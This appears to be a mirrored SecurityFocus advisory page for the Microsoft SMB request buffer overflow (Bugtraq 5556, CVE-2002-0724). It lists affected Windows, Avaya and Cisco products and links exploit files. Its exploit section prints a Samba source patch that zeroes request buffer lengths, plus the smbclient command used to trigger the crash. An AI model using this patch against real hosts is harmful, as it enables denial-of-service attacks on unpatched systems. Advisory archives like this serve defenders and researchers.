#SpeeDr00t@Black Falcon<br>#bid5556<p><b><span style="font-size: 18pt;">Microsoft Network Share Provider SMB Request Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/5556/info">info</a><br><a href="http://www.securityfocus.com/bid/5556/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/5556/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/5556/solution">solution</a><br><a href="http://www.securityfocus.com/bid/5556/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				5556
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Boundary Condition Error
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
				
					CVE-2002-0724<br/>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Aug 22 2002 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jul 11 2009 03:56PM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Credit is given to Alberto Solino and Hernan Ochoa.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Windows XP Professional  <br/>
					
				
					Microsoft Windows XP Home  <br/>
					
				
					Microsoft Windows XP 64-bit Edition  <br/>
					
				
					Microsoft Windows XP  0<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP6a<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP6<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP5<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP4<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP3<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP2<br/>
					
				
					Microsoft Windows NT Workstation  4.0 SP1<br/>
					
				
					Microsoft Windows NT Workstation  4.0<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP6<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP5<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP4<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP3<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP2<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0 SP1<br/>
					
				
					Microsoft Windows NT Terminal Server  4.0<br/>
					
				
					Microsoft Windows NT Server  4.0 SP6a<br/>
<span class="related">
						
							+ 
						
						Avaya DefinityOne Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya DefinityOne Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya IP600 Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya IP600 Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya S3400 Message Application Server  0<br/>
</span>
<span class="related">
						
							+ 
						
						Avaya S8100 Media Servers  0<br/>
</span>
<span class="related">
						
							+ 
						
						Avaya S8100 Media Servers  0<br/>
</span>
					
				
					Microsoft Windows NT Server  4.0 SP6<br/>
					
				
					Microsoft Windows NT Server  4.0 SP5<br/>
					
				
					Microsoft Windows NT Server  4.0 SP4<br/>
					
				
					Microsoft Windows NT Server  4.0 SP3<br/>
					
				
					Microsoft Windows NT Server  4.0 SP2<br/>
					
				
					Microsoft Windows NT Server  4.0 SP1<br/>
					
				
					Microsoft Windows NT Server  4.0<br/>
					
				
					Microsoft Windows 2000 Server  SP3<br/>
					
				
					Microsoft Windows 2000 Server  SP2<br/>
					
				
					Microsoft Windows 2000 Server  SP1<br/>
					
				
					Microsoft Windows 2000 Server  <br/>
<span class="related">
						
							+ 
						
						Avaya DefinityOne Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya IP600 Media Servers  <br/>
</span>
<span class="related">
						
							+ 
						
						Avaya S3400 Message Application Server  0<br/>
</span>
<span class="related">
						
							+ 
						
						Avaya S8100 Media Servers  0<br/>
</span>
					
				
					Microsoft Windows 2000 Professional  SP3<br/>
					
				
					Microsoft Windows 2000 Professional  SP2<br/>
					
				
					Microsoft Windows 2000 Professional  SP1<br/>
					
				
					Microsoft Windows 2000 Professional  <br/>
					
				
					Microsoft Windows 2000 Advanced Server  SP3<br/>
					
				
					Microsoft Windows 2000 Advanced Server  SP2<br/>
					
				
					Microsoft Windows 2000 Advanced Server  SP1<br/>
					
				
					Microsoft Windows 2000 Advanced Server  <br/>
					
				
					Cisco ICS Firmware 2.0 <br/>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
					
				
					Cisco ICS Firmware 1.0 <br/>
<span class="related">
						
							+ 
						
						Cisco ICS 7750  <br/>
</span>
					
				
					Cisco ICS 7750  <br/>
					
				
					Cisco Call Manager 3.2 <br/>
<span class="related">
						
							+ 
						
						Cisco VoIP Phone 7902G  0<br/>
</span>
<span class="related">
						
							+ 
						
						Cisco VoIP Phone 7905G  0<br/>
</span>
<span class="related">
						
							+ 
						
						Cisco VoIP Phone 7912G  0<br/>
</span>
					
				
					Cisco Call Manager 3.1 (3a)<br/>
					
				
					Cisco Call Manager 3.1 (2)<br/>
					
				
					Cisco Call Manager 3.1 <br/>
					
				
					Cisco Call Manager 3.0 <br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x6000/5556/SMBdie.zip">#exploit_SMBdie.zip</a><br><a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x6000/5556/smbnuke.c">#exploit_smbnuke.c</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	A Samba patch which allows exploitation of this issue is available:<br/><br/>Patch for samba-latest.tar.gz<br/><br/>Exploit with:<br/><br/>smbclient -L &amp;lt;targetIP&amp;gt; -N<br/><br/>--------------------<br/><br/>--- samba-2.2.5.original/source/libsmb/clirap.c		 Tue Jun 18 21:13:44 2002<br/>+++ samba-2.2.5.exploit/source/libsmb/clirap.c		 Fri Aug 16 22:17:45 2002<br/>@@ -237,8 +237,10 @@<br/> 		 		 STR_TERMINATE | STR_CONVERT | STR_ASCII);<br/><br/> 		 if (cli_api(cli,<br/>-                    param, PTR_DIFF(p,param), 8,        /* params, length, max */<br/>-                    NULL, 0, CLI_BUFFER_SIZE,               /* data, length, max */<br/>+//                    param, PTR_DIFF(p,param), 8,        /* params, length, max */<br/>+//                    NULL, 0, CLI_BUFFER_SIZE,               /* data, length, max */<br/>+                    param, PTR_DIFF(p,param), 0,<br/>+		 		     NULL, 0, 0,<br/>                     &amp;amp;rparam, &amp;amp;rprcnt,                   /* return params, return size */<br/>                     &amp;amp;rdata, &amp;amp;rdrcnt                     /* return data, return size */<br/>                    )) {<br/><br/>--------------------<br/><br/>A binary exploit has also been released. This exploit code has not been tested by Symantec. As always, caution is advised when dealing with binary code received from unknown sources. Exploit credit is given to Zamolx3 &amp;lt;zamolx3@personal.ro&amp;gt;.<br/><br/>An exploit has been provided by Frederic Deletang &amp;lt;df@phear.org&amp;gt;.<br/><br/>CORE has developed a working commercial exploit for their IMPACT product. This exploit is not otherwise publicly available or known to be circulating in the wild.
	
		<ul>
<li><a href="/data/vulnerabilities/exploits/SMBdie.zip">/data/vulnerabilities/exploits/SMBdie.zip</a></li>
<li><a href="/data/vulnerabilities/exploits/smbnuke.c">/data/vulnerabilities/exploits/smbnuke.c</a></li>
</ul>
</div>